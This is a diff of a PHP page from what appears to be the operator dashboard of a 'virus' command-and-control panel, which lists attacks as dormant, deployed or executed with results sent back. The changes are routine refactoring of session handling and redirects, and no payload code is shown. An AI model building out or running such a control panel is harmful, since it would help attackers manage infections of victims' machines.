@@ -7,7 +7,6 @@ use Kelvinho\Virus\Attack\PackageRegistrar;
 use Kelvinho\Virus\Singleton\Header;
 use Kelvinho\Virus\Singleton\HtmlTemplate;
 use Kelvinho\Virus\Singleton\Timezone;
-use Kelvinho\Virus\User\User;
 use Kelvinho\Virus\Virus\Virus;
 use function Kelvinho\Virus\db;
 use function Kelvinho\Virus\filter;
@@ -15,23 +14,6 @@ use function Kelvinho\Virus\formattedHash;
 use function Kelvinho\Virus\formattedTime;
 use function Kelvinho\Virus\initializeArray;
 use function Kelvinho\Virus\map;
-
-if ($requestData->hasGet("virus_id")) {
-    $virus_id = $requestData->get("virus_id");
-    $session->set("virus_id", $virus_id);
-} else {
-    if ($session->has("virus_id")) {
-        $virus_id = $session->get("virus_id");
-    } else {
-        header("Location: " . DOMAIN);
-        Header::redirect();
-    }
-}
-
-if (!Virus::exists($virus_id)) {
-    header("Location: " . DOMAIN);
-    Header::redirect();
-}
 
 /**
  * Returns a table element with all you need to display
@@ -68,10 +50,9 @@ function displayTable(array $attacks, array $labels, callable $contents, $extraD
     return ob_get_clean();
 }
 
-if (!$authenticator->authorized($virus_id)) {
-    header("Location: " . DOMAIN);
-    Header::redirect();
-}
+$virus_id = $session->getCheck("virus_id");
+if (!$authenticator->authorized($virus_id)) Header::redirectToHome();
+
 $virus = $virusFactory->get($virus_id);
 $user = $userFactory->get($session->get("user_handle")); ?>
 <html lang="en_US">
@@ -178,7 +159,7 @@ $user = $userFactory->get($session->get("user_handle")); ?>
     here until you want to attack.</p>
 <?php echo displayTable(Virus::getAttacks($virus_id, AttackBase::STATUS_DORMANT), ["Name", "Package", "Hash/id", ""], function ($attack_id) use ($attackFactory) {
     $attack = $attackFactory->get($attack_id);
-    $onclick = "onclick = \"redirect('" . DOMAIN_ATTACK_INFO . "?attack_id=" . $attack_id . "')\"";
+    $onclick = "onclick = \"redirect('$attack_id')\"";
     return ["<a $onclick>" . $attack->getName() . "</a>",
         "<a $onclick>" . PackageRegistrar::getDisplayName($attack->getPackageDbName()) . "</a>",
         "<a $onclick>" . formattedHash($attack->getAttackId()) . "</a>",
@@ -192,7 +173,7 @@ $user = $userFactory->get($session->get("user_handle")); ?>
     over again.</p>
 <?php echo displayTable(Virus::getAttacks($virus_id, AttackBase::STATUS_DEPLOYED), ["Name", "Package", "Hash/id", ""], function ($attack_id) use ($attackFactory) {
     $attack = $attackFactory->get($attack_id);
-    $onclick = "onclick = \"redirect('" . DOMAIN_ATTACK_INFO . "?attack_id=" . $attack_id . "')\"";
+    $onclick = "onclick = \"redirect('$attack_id')\"";
     return ["<a $onclick>" . $attack->getName() . "</a>",
         "<a $onclick>" . PackageRegistrar::getDisplayName($attack->getPackageDbName()) . "</a>",
         "<a $onclick>" . formattedHash($attack->getAttackId()) . "</a>",
@@ -202,7 +183,7 @@ $user = $userFactory->get($session->get("user_handle")); ?>
 <p>These are attacks that are executed, and the virus has sent back results.</p>
 <?php echo displayTable(Virus::getAttacks($virus_id, AttackBase::STATUS_EXECUTED), ["Name", "Package", "Hash/id", "Executed time", ""], function ($attack_id, $timezone) use ($attackFactory) {
     $attack = $attackFactory->get($attack_id);
-    $onclick = "onclick = \"redirect('" . DOMAIN_ATTACK_INFO . "?attack_id=" . $attack_id . "')\"";
+    $onclick = "onclick = \"redirect('$attack_id')\"";
     return ["<a $onclick>" . $attack->getName() . "</a>",
         "<a $onclick>" . PackageRegistrar::getDisplayName($attack->getPackageDbName()) . "</a>",
         "<a $onclick>" . formattedHash($attack->getAttackId()) . "</a>",
@@ -350,8 +331,17 @@ $user = $userFactory->get($session->get("user_handle")); ?>
         });
     }
 
-    function redirect(location) {
-        window.location = location;
+    function redirect(attack_id) {
+        $.ajax({
+            url: "<?php echo DOMAIN_CONTROLLER; ?>/setAttackId",
+            type: "POST",
+            data: {
+                attack_id: attack_id,
+            },
+            success: function () {
+                window.location = "<?php echo DOMAIN_ATTACK_INFO; ?>"
+            }
+        });
     }
 
     <?php
